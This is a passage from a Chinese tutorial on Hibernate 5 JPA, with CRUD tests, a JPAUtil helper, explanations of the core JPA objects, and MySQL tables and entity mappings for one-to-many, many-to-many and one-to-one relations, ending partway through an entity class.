&lt;h3 id=&quot;14、hibernate5-jpa增删改查&quot;&gt;1.4、Hibernate5 JPA增删改查&lt;/h3&gt;
&lt;p&gt;CustomerJPATest.java（全路径：/hibernate_jpa/src/com/caochenlei/hibernate/jpa/CustomerJPATest.java）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package com.caochenlei.hibernate.jpa;

import javax.persistence.EntityManager;
import javax.persistence.EntityManagerFactory;
import javax.persistence.EntityTransaction;
import javax.persistence.Persistence;

import org.junit.Test;

public class CustomerJPATest {

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=create
         * 保存操作
         */
        @Test
        public void testSave() {
                // 获取实体管理器工厂            
                EntityManagerFactory entityManagerFactory = Persistence.createEntityManagerFactory(&quot;myJpa&quot;);
                // 获取实体管理器
                EntityManager entityManager = entityManagerFactory.createEntityManager();
                // 获取事务
                EntityTransaction transaction = entityManager.getTransaction();
                // 开启事务
                transaction.begin();
                // 创建实体对象并保存
                Customer customer1 = new Customer();
                customer1.setCustName(&quot;张三&quot;);
                entityManager.persist(customer1);

                Customer customer2 = new Customer();
                customer2.setCustName(&quot;李四&quot;);
                entityManager.persist(customer2);

                Customer customer3 = new Customer();
                customer3.setCustName(&quot;王五&quot;);
                entityManager.persist(customer3);
                // 提交事务
                transaction.commit();
                // 释放资源
                entityManager.close();
                entityManagerFactory.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 立即查询操作
         */
        @Test
        public void testQuery1() {
                // 获取实体管理器工厂            
                EntityManagerFactory entityManagerFactory = Persistence.createEntityManagerFactory(&quot;myJpa&quot;);
                // 获取实体管理器
                EntityManager entityManager = entityManagerFactory.createEntityManager();
                // 获取事务
                EntityTransaction transaction = entityManager.getTransaction();
                // 开启事务
                transaction.begin();
                // 查询实体并输出
                Customer customer = entityManager.find(Customer.class, 2L);
                System.out.println(customer);
                // 提交事务
                transaction.commit();
                // 释放资源
                entityManager.close();
                entityManagerFactory.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 延迟查询操作
         */
        @Test
        public void testQuery2() {
                // 获取实体管理器工厂            
                EntityManagerFactory entityManagerFactory = Persistence.createEntityManagerFactory(&quot;myJpa&quot;);
                // 获取实体管理器
                EntityManager entityManager = entityManagerFactory.createEntityManager();
                // 获取事务
                EntityTransaction transaction = entityManager.getTransaction();
                // 开启事务
                transaction.begin();
                // 查询实体并输出
                Customer customer = entityManager.getReference(Customer.class, 2L);
                System.out.println(customer);
                // 提交事务
                transaction.commit();
                // 释放资源
                entityManager.close();
                entityManagerFactory.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 删除操作
         */
        @Test
        public void testDelete() {
                // 获取实体管理器工厂            
                EntityManagerFactory entityManagerFactory = Persistence.createEntityManagerFactory(&quot;myJpa&quot;);
                // 获取实体管理器
                EntityManager entityManager = entityManagerFactory.createEntityManager();
                // 获取事务
                EntityTransaction transaction = entityManager.getTransaction();
                // 开启事务
                transaction.begin();
                // 查询实体并删除
                Customer customer = entityManager.find(Customer.class, 1L);
                entityManager.remove(customer);
                // 提交事务
                transaction.commit();
                // 释放资源
                entityManager.close();
                entityManagerFactory.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 更新操作
         */
        @Test
        public void testUpdate() {
                // 获取实体管理器工厂            
                EntityManagerFactory entityManagerFactory = Persistence.createEntityManagerFactory(&quot;myJpa&quot;);
                // 获取实体管理器
                EntityManager entityManager = entityManagerFactory.createEntityManager();
                // 获取事务
                EntityTransaction transaction = entityManager.getTransaction();
                // 开启事务
                transaction.begin();
                // 查询实体并更新
                Customer customer = entityManager.find(Customer.class, 2L);
                customer.setCustSource(&quot;电视广告&quot;);
                entityManager.merge(customer);
                // 提交事务
                transaction.commit();
                // 释放资源
                entityManager.close();
                entityManagerFactory.close();
        }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;15、hibernate5-jpa工具类&quot;&gt;1.5、Hibernate5 JPA工具类&lt;/h3&gt;
&lt;p&gt;JPAUtil.java（全路径：/hibernate_jpa/src/com/caochenlei/hibernate/jpa/JPAUtil.java）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package com.caochenlei.hibernate.jpa;

import javax.persistence.EntityManager;
import javax.persistence.EntityManagerFactory;
import javax.persistence.Persistence;

public class JPAUtil {

        private static EntityManagerFactory entityManagerFactory;

        static {
                entityManagerFactory = Persistence.createEntityManagerFactory(&quot;myJpa&quot;);
        }

        public static EntityManager getEntityManager() {
                return entityManagerFactory.createEntityManager();
        }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;第二章-hibernate5-jpa核心对象&quot;&gt;第二章 Hibernate5 JPA核心对象&lt;/h2&gt;
&lt;h3 id=&quot;21、persistence&quot;&gt;2.1、Persistence&lt;/h3&gt;
&lt;p&gt;Persistence对象主要作用是用于获取EntityManagerFactory对象的 。通过调用该类的createEntityManagerFactory静态方法，根据配置文件中持久化单元名称创建EntityManagerFactory。&lt;/p&gt;
&lt;h3 id=&quot;22、entitymanagerfactory&quot;&gt;2.2、EntityManagerFactory&lt;/h3&gt;
&lt;p&gt;EntityManagerFactory 接口主要用来创建 EntityManager 实例。&lt;/p&gt;
&lt;h3 id=&quot;23、entitymanager&quot;&gt;2.3、EntityManager&lt;/h3&gt;
&lt;p&gt;在 JPA 规范中，EntityManager是完成持久化操作的核心对象。实体类作为普通 java对象，只有在调用 EntityManager将其持久化后才会变成持久化对象。EntityManager对象在一组实体类与底层数据源之间进行 O/R 映射的管理。它可以用来管理和更新 Entity Bean，根椐主键查找 Entity Bean, 还可以通过JPQL语句查询实体。我们可以通过调用EntityManager的方法完成获取事务，以及持久化数据库的操作，例如：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;getTransaction：获取事务对象&lt;/li&gt;
&lt;li&gt;persist：保存操作&lt;/li&gt;
&lt;li&gt;merge：更新操作&lt;/li&gt;
&lt;li&gt;remove：删除操作&lt;/li&gt;
&lt;li&gt;find/getReference：根据id查询&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;24、entitytransaction&quot;&gt;2.4、EntityTransaction&lt;/h3&gt;
&lt;p&gt;在 JPA 规范中，EntityTransaction是完成事务操作的核心对象，对于EntityTransaction在我们的Java代码中承接的功能比较简单。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;begin：开启事务&lt;/li&gt;
&lt;li&gt;commit：提交事务&lt;/li&gt;
&lt;li&gt;rollback：回滚事务&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;第三章-hibernate5-jpa映射配置&quot;&gt;第三章 Hibernate5 JPA映射配置&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/caochenlei/BlogImages/raw/master/20200808125605.png&quot; alt=&quot;image-20200806220635419&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;31、一对多关联&quot;&gt;3.1、一对多关联&lt;/h3&gt;
&lt;h4 id=&quot;311、修改实体&quot;&gt;3.1.1、修改实体&lt;/h4&gt;
&lt;p&gt;修改Customer.java（全路径：/hibernate_jpa/src/com/caochenlei/hibernate/jpa/Customer.java）&lt;/p&gt;
&lt;p&gt;在toString方法的下面添加多的集合&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;/**
 * 一对多：一的一方配置多的集合
 * @OneToMany   ：映射一对多
 *      * fetch         ：抓取策略
 *              FetchType.LAZY          ：延迟加载（默认）
 *              FetchType.EAGER         ：迫切查询（多表连接查询）
 *      * cascade       ：级联操作
 *              CascadeType.PERSIST     ：级联保存
 *              CascadeType.MERGE       ：级联更新
 *              CascadeType.REMOVE      ：级联删除
 *              CascadeType.ALL         ：全部支持
 *  * mappedBy  ：放弃外键维护
 */
@OneToMany(fetch = FetchType.EAGER, cascade = CascadeType.ALL, mappedBy = &quot;customer&quot;)
private Set&amp;lt;LinkMan&amp;gt; linkMans = new HashSet&amp;lt;LinkMan&amp;gt;();

public Set&amp;lt;LinkMan&amp;gt; getLinkMans() {
        return linkMans;
}

public void setLinkMans(Set&amp;lt;LinkMan&amp;gt; linkMans) {
        this.linkMans = linkMans;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;修改LinkMan.java（全路径：/hibernate_jpa/src/com/caochenlei/hibernate/jpa/LinkMan.java）&lt;/p&gt;
&lt;p&gt;在toString方法的下面添加一的对象&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;/**
 * 多对一：多的一方配置一的对象
 * @ManyToOne   ：映射多对一
 *      * fetch         ：抓取策略
 *              FetchType.LAZY          ：延迟加载（默认）
 *              FetchType.EAGER         ：迫切查询（多表连接查询）
 *      * cascade       ：级联操作
 *              CascadeType.PERSIST     ：级联保存
 *              CascadeType.MERGE       ：级联更新
 *              CascadeType.REMOVE      ：级联删除
 *              CascadeType.ALL         ：全部支持
 * @JoinColumn  ：设置两张表之间外键列
 *              name                            ；外键的名称
 */
@ManyToOne(fetch = FetchType.EAGER, cascade = CascadeType.ALL)
@JoinColumn(name = &quot;lkm_cust_id&quot;)
private Customer customer = new Customer();

public Customer getCustomer() {
        return customer;
}

public void setCustomer(Customer customer) {
        this.customer = customer;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;312、测试代码&quot;&gt;3.1.2、测试代码&lt;/h4&gt;
&lt;p&gt;OneToManyTest.java（全路径：/hibernate_jpa/src/com/caochenlei/hibernate/jpa/OneToManyTest.java）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package com.caochenlei.hibernate.jpa;

import java.util.Set;

import javax.persistence.EntityManager;
import javax.persistence.EntityTransaction;

import org.junit.Test;

public class OneToManyTest {

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=create
         * 保存客户级联保存联系人
         */
        @Test
        public void test1() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                // 创建两个客户
                Customer customer1 = new Customer();
                customer1.setCustName(&quot;张三&quot;);
                Customer customer2 = new Customer();
                customer2.setCustName(&quot;李四&quot;);

                // 创建三个联系人
                LinkMan linkMan1 = new LinkMan();
                linkMan1.setLkmName(&quot;凤姐&quot;);
                LinkMan linkMan2 = new LinkMan();
                linkMan2.setLkmName(&quot;如花&quot;);
                LinkMan linkMan3 = new LinkMan();
                linkMan3.setLkmName(&quot;旺财&quot;);

                customer1.getLinkMans().add(linkMan1);
                customer1.getLinkMans().add(linkMan2);
                customer2.getLinkMans().add(linkMan3);
                linkMan1.setCustomer(customer1);
                linkMan2.setCustomer(customer1);
                linkMan3.setCustomer(customer2);

                entityManager.persist(customer1);
                entityManager.persist(customer2);

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=create
         * 保存联系人级联保存客户
         */
        @Test
        public void test2() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                // 创建两个客户
                Customer customer1 = new Customer();
                customer1.setCustName(&quot;张三&quot;);
                Customer customer2 = new Customer();
                customer2.setCustName(&quot;李四&quot;);

                // 创建三个联系人
                LinkMan linkMan1 = new LinkMan();
                linkMan1.setLkmName(&quot;凤姐&quot;);
                LinkMan linkMan2 = new LinkMan();
                linkMan2.setLkmName(&quot;如花&quot;);
                LinkMan linkMan3 = new LinkMan();
                linkMan3.setLkmName(&quot;旺财&quot;);

                customer1.getLinkMans().add(linkMan1);
                customer1.getLinkMans().add(linkMan2);
                customer2.getLinkMans().add(linkMan3);
                linkMan1.setCustomer(customer1);
                linkMan2.setCustomer(customer1);
                linkMan3.setCustomer(customer2);

                entityManager.persist(linkMan1);
                entityManager.persist(linkMan2);
                entityManager.persist(linkMan3);

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 查询客户级联查询联系人
         */
        @Test
        public void test3() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                Customer customer = entityManager.find(Customer.class, 1L);
                System.out.println(customer);

                Set&amp;lt;LinkMan&amp;gt; linkMans = customer.getLinkMans();
                for (LinkMan linkMan : linkMans) {
                        System.out.println(linkMan);
                }

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 查询联系人级联查询客户
         */
        @Test
        public void test4() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                LinkMan linkMan = entityManager.find(LinkMan.class, 1L);
                System.out.println(linkMan);

                Customer customer = linkMan.getCustomer();
                System.out.println(customer);

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 修改客户、修改联系人，保存客户级联保存联系人
         */
        @Test
        public void test5() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                Customer customer = entityManager.find(Customer.class, 1L);
                customer.setCustSource(&quot;电视广告&quot;);

                Set&amp;lt;LinkMan&amp;gt; linkMans = customer.getLinkMans();
                for (LinkMan linkMan : linkMans) {
                        linkMan.setLkmMobile(&quot;15633029014&quot;);
                }

                entityManager.persist(customer);

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 修改客户、修改联系人，保存联系人级联保存客户
         */
        @Test
        public void test6() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                LinkMan linkMan = entityManager.find(LinkMan.class, 1L);
                linkMan.setLkmMobile(&quot;110&quot;);

                Customer customer = linkMan.getCustomer();
                customer.setCustMobile(&quot;110&quot;);

                entityManager.persist(linkMan);

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 删除客户级联删除联系人
         */
        @Test
        public void test7() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                Customer customer = entityManager.find(Customer.class, 1L);
                entityManager.remove(customer);

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 删除联系人级联删除客户
         */
        @Test
        public void test8() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                LinkMan linkMan = entityManager.find(LinkMan.class, 3L);
                entityManager.remove(linkMan);

                transaction.commit();
                entityManager.close();
        }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;32、多对多关联&quot;&gt;3.2、多对多关联&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/caochenlei/BlogImages/raw/master/20200808141115.png&quot; alt=&quot;image-20200806230944798&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;sys_user（用户表）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-mysql&quot;&gt;CREATE TABLE `sys_user` (
  `user_id` bigint(32) NOT NULL AUTO_INCREMENT COMMENT '用户id',
  `user_code` varchar(32) DEFAULT NULL COMMENT '用户账号',
  `user_name` varchar(64) DEFAULT NULL COMMENT '用户名称',
  `user_password` varchar(32) DEFAULT NULL COMMENT '用户密码',
  `user_state` char(1) DEFAULT NULL COMMENT '用户状态',
  PRIMARY KEY (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;sys_role（角色表）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-mysql&quot;&gt;CREATE TABLE `sys_role` (
  `role_id` bigint(32) NOT NULL AUTO_INCREMENT COMMENT '角色id',
  `role_name` varchar(32) DEFAULT NULL COMMENT '角色名称',
  `role_memo` varchar(128) DEFAULT NULL COMMENT '角色备注',
  PRIMARY KEY (`role_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;sys_user_role（中间表）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-mysql&quot;&gt;CREATE TABLE `sys_user_role` (
  `role_id` bigint(32) NOT NULL COMMENT '角色id',
  `user_id` bigint(32) NOT NULL COMMENT '用户id',
  PRIMARY KEY (`role_id`,`user_id`),
  KEY `FK_user_role_user_id` (`user_id`),
  CONSTRAINT `FK_user_role_role_id` FOREIGN KEY (`role_id`) REFERENCES `sys_role` (`role_id`) ON DELETE NO ACTION ON UPDATE NO ACTION,
  CONSTRAINT `FK_user_role_user_id` FOREIGN KEY (`user_id`) REFERENCES `sys_user` (`user_id`) ON DELETE NO ACTION ON UPDATE NO ACTION
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;321、创建实体&quot;&gt;3.2.1、创建实体&lt;/h4&gt;
&lt;p&gt;User.java（全路径：/hibernate_jpa/src/com/caochenlei/hibernate/jpa/User.java）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package com.caochenlei.hibernate.jpa;

import java.util.HashSet;
import java.util.Set;

import javax.persistence.CascadeType;
import javax.persistence.Column;
import javax.persistence.Entity;
import javax.persistence.FetchType;
import javax.persistence.GeneratedValue;
import javax.persistence.GenerationType;
import javax.persistence.Id;
import javax.persistence.JoinColumn;
import javax.persistence.JoinTable;
import javax.persistence.ManyToMany;
import javax.persistence.Table;

@Entity
@Table(name = &quot;sys_user&quot;)
public class User {

        @Id
        @GeneratedValue(strategy = GenerationType.IDENTITY)
        @Column(name = &quot;user_id&quot;)
        private Long userId;

        @Column(name = &quot;user_code&quot;)
        private String userCode;

        @Column(name = &quot;user_name&quot;)
        private String userName;

        @Column(name = &quot;user_password&quot;)
        private String userPassword;

        @Column(name = &quot;user_state&quot;)
        private String userState;

        public Long getUserId() {
                return userId;
        }

        public void setUserId(Long userId) {
                this.userId = userId;
        }

        public String getUserCode() {
                return userCode;
        }

        public void setUserCode(String userCode) {
                this.userCode = userCode;
        }

        public String getUserName() {
                return userName;
        }

        public void setUserName(String userName) {
                this.userName = userName;
        }

        public String getUserPassword() {
                return userPassword;
        }

        public void setUserPassword(String userPassword) {
                this.userPassword = userPassword;
        }

        public String getUserState() {
                return userState;
        }

        public void setUserState(String userState) {
                this.userState = userState;
        }

        @Override
        public String toString() {
                return &quot;User [userId=&quot; + userId + &quot;, userCode=&quot; + userCode + &quot;, userName=&quot; + userName + &quot;, userPassword=&quot; + userPassword + &quot;, userState=&quot; + userState + &quot;]&quot;;
        }

        /**
         * 多对多：另一方的集合对象
         * @ManyToMany  ：映射多对多
         *      * fetch         ：抓取策略
         *              FetchType.LAZY          ：延迟加载（默认）
         *              FetchType.EAGER         ：迫切查询（多表连接查询）
         *      * cascade       ：级联操作
         *              CascadeType.PERSIST     ：级联保存
         *              CascadeType.MERGE       ：级联更新
         *              CascadeType.REMOVE      ：级联删除
         *              CascadeType.ALL         ：全部支持
         * @JoinTable   ：用于对应中间表的设置
         *      * name                          ：中间表名称
         *      * joinColumns           ：设置中间表与本表关联的外键
         *      * inverseJoinColumns：设置中间表与关联表对应的外键
         */
        @ManyToMany(fetch = FetchType.EAGER, cascade = CascadeType.ALL)
        @JoinTable(name = &quot;sys_user_role&quot;, joinColumns = @JoinColumn(name = &quot;user_id&quot;), inverseJoinColumns = @JoinColumn(name = &quot;role_id&quot;))
        private Set&amp;lt;Role&amp;gt; roles = new HashSet&amp;lt;Role&amp;gt;();

        public Set&amp;lt;Role&amp;gt; getRoles() {
                return roles;
        }

        public void setRoles(Set&amp;lt;Role&amp;gt; roles) {
                this.roles = roles;
        }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Role.java（全路径：/hibernate_jpa/src/com/caochenlei/hibernate/jpa/Role.java）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package com.caochenlei.hibernate.jpa;

import java.util.HashSet;
import java.util.Set;

import javax.persistence.CascadeType;
import javax.persistence.Column;
import javax.persistence.Entity;
import javax.persistence.FetchType;
import javax.persistence.GeneratedValue;
import javax.persistence.GenerationType;
import javax.persistence.Id;
import javax.persistence.ManyToMany;
import javax.persistence.Table;

@Entity
@Table(name = &quot;sys_role&quot;)
public class Role {

        @Id
        @GeneratedValue(strategy = GenerationType.IDENTITY)
        @Column(name = &quot;role_id&quot;)
        private Long roleId;

        @Column(name = &quot;role_name&quot;)
        private String roleName;

        @Column(name = &quot;role_memo&quot;)
        private String roleMemo;

        public Long getRoleId() {
                return roleId;
        }

        public void setRoleId(Long roleId) {
                this.roleId = roleId;
        }

        public String getRoleName() {
                return roleName;
        }

        public void setRoleName(String roleName) {
                this.roleName = roleName;
        }

        public String getRoleMemo() {
                return roleMemo;
        }

        public void setRoleMemo(String roleMemo) {
                this.roleMemo = roleMemo;
        }

        @Override
        public String toString() {
                return &quot;Role [roleId=&quot; + roleId + &quot;, roleName=&quot; + roleName + &quot;, roleMemo=&quot; + roleMemo + &quot;]&quot;;
        }

        /**
         * 多对多：另一方的集合对象
         * @ManyToMany  ：映射多对多
         *      * fetch         ：抓取策略
         *              FetchType.LAZY          ：延迟加载（默认）
         *              FetchType.EAGER         ：迫切查询（多表连接查询）
         *      * cascade       ：级联操作
         *              CascadeType.PERSIST     ：级联保存
         *              CascadeType.MERGE       ：级联更新
         *              CascadeType.REMOVE      ：级联删除
         *              CascadeType.ALL         ：全部支持
         *  * mappedBy  ：放弃外键维护
         */
        @ManyToMany(fetch = FetchType.EAGER, cascade = CascadeType.ALL, mappedBy = &quot;roles&quot;)
        private Set&amp;lt;User&amp;gt; users = new HashSet&amp;lt;User&amp;gt;();

        public Set&amp;lt;User&amp;gt; getUsers() {
                return users;
        }

        public void setUsers(Set&amp;lt;User&amp;gt; users) {
                this.users = users;
        }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;322、测试代码&quot;&gt;3.2.2、测试代码&lt;/h4&gt;
&lt;p&gt;ManyToManyTest.java（全路径：/hibernate_jpa/src/com/caochenlei/hibernate/jpa/ManyToManyTest.java）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package com.caochenlei.hibernate.jpa;

import java.util.Set;

import javax.persistence.EntityManager;
import javax.persistence.EntityTransaction;

import org.junit.Test;

public class ManyToManyTest {

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=create
         * 保存用户级联保存角色
         */
        @Test
        public void test1() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                // 创建两个用户
                User user1 = new User();
                user1.setUserName(&quot;曹晨磊&quot;);
                User user2 = new User();
                user2.setUserName(&quot;曹晨旭&quot;);

                // 创建三个角色
                Role role1 = new Role();
                role1.setRoleName(&quot;吕布&quot;);
                Role role2 = new Role();
                role2.setRoleName(&quot;东皇&quot;);
                Role role3 = new Role();
                role3.setRoleName(&quot;赵云&quot;);

                user1.getRoles().add(role1);
                user1.getRoles().add(role2);
                user2.getRoles().add(role3);
                role1.getUsers().add(user1);
                role2.getUsers().add(user1);
                role3.getUsers().add(user2);

                entityManager.persist(user1);
                entityManager.persist(user2);

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=create
         * 保存角色级联保存用户
         */
        @Test
        public void test2() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                // 创建两个用户
                User user1 = new User();
                user1.setUserName(&quot;曹晨磊&quot;);
                User user2 = new User();
                user2.setUserName(&quot;曹晨旭&quot;);

                // 创建三个角色
                Role role1 = new Role();
                role1.setRoleName(&quot;吕布&quot;);
                Role role2 = new Role();
                role2.setRoleName(&quot;东皇&quot;);
                Role role3 = new Role();
                role3.setRoleName(&quot;赵云&quot;);

                user1.getRoles().add(role1);
                user1.getRoles().add(role2);
                user2.getRoles().add(role3);
                role1.getUsers().add(user1);
                role2.getUsers().add(user1);
                role3.getUsers().add(user2);

                entityManager.persist(role1);
                entityManager.persist(role2);
                entityManager.persist(role3);

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 查询用户级联查询角色
         */
        @Test
        public void test3() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                User user = entityManager.find(User.class, 1L);
                System.out.println(user);

                Set&amp;lt;Role&amp;gt; roles = user.getRoles();
                for (Role role : roles) {
                        System.out.println(role);
                }

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 查询角色级联查询用户
         */
        @Test
        public void test4() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                Role role = entityManager.find(Role.class, 3L);
                System.out.println(role);

                Set&amp;lt;User&amp;gt; users = role.getUsers();
                for (User user : users) {
                        System.out.println(user);
                }

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 修改用户、修改角色，更新用户级联更新角色
         */
        @Test
        public void test5() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                User user = entityManager.find(User.class, 1L);
                user.setUserPassword(&quot;123456&quot;);

                Set&amp;lt;Role&amp;gt; roles = user.getRoles();
                for (Role role : roles) {
                        role.setRoleMemo(&quot;123456&quot;);
                }

                entityManager.merge(user);

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 修改用户、修改角色，更新角色级联更新用户
         */
        @Test
        public void test6() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                Role role = entityManager.find(Role.class, 3L);
                role.setRoleMemo(&quot;123456&quot;);

                Set&amp;lt;User&amp;gt; users = role.getUsers();
                for (User user : users) {
                        user.setUserPassword(&quot;123456&quot;);
                }

                entityManager.merge(role);

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 删除用户级联删除角色
         */
        @Test
        public void test7() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                User user = entityManager.find(User.class, 1L);
                entityManager.remove(user);

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 删除角色级联删除用户
         */
        @Test
        public void test8() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                Role role = entityManager.find(Role.class, 3L);
                entityManager.remove(role);

                transaction.commit();
                entityManager.close();
        }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;33、一对一关联&quot;&gt;3.3、一对一关联&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/caochenlei/BlogImages/raw/master/20200808154251.png&quot; alt=&quot;image-20200808154248502&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;student_base_info（学生信息基本表）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-mysql&quot;&gt;CREATE TABLE `student_base_info` (
  `stu_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '学生id',
  `stu_name` varchar(20) DEFAULT NULL COMMENT '学生姓名',
  `stu_sex` varchar(20) DEFAULT NULL COMMENT '学生性别',
  PRIMARY KEY (`stu_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;student_other_info（学生信息拓展表）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-mysql&quot;&gt;CREATE TABLE `student_other_info` (
  `stu_id` bigint(20) NOT NULL COMMENT '学生id',
  `stu_img` varchar(255) DEFAULT NULL COMMENT '学生头像',
  `stu_address` varchar(255) DEFAULT NULL COMMENT '学生地址',
  PRIMARY KEY (`stu_id`),
  CONSTRAINT `FK_stu_id` FOREIGN KEY (`stu_id`) REFERENCES `student_base_info` (`stu_id`) ON DELETE NO ACTION ON UPDATE NO ACTION
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;331、创建实体&quot;&gt;3.3.1、创建实体&lt;/h4&gt;
&lt;p&gt;StuBaseInfo.java（全路径：/hibernate_jpa/src/com/caochenlei/hibernate/jpa/StuBaseInfo.java）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package com.caochenlei.hibernate.jpa;

import javax.persistence.CascadeType;
import javax.persistence.Column;
import javax.persistence.Entity;
import javax.persistence.FetchType;
import javax.persistence.GeneratedValue;
import javax.persistence.GenerationType;
import javax.persistence.Id;
import javax.persistence.OneToOne;
import javax.persistence.Table;

@Entity
@Table(name = &quot;student_base_info&quot;)
public class StuBaseInfo {

        @Id
        @GeneratedValue(strategy = GenerationType.IDENTITY)
        @Column(name = &quot;stu_id&quot;)
        private Long stuId;

        @Column(name = &quot;stu_name&quot;)
        private String stuName;

        @Column(name = &quot;stu_sex&quot;)
        private String stuSex;

        public Long getStuId() {
                return stuId;
        }

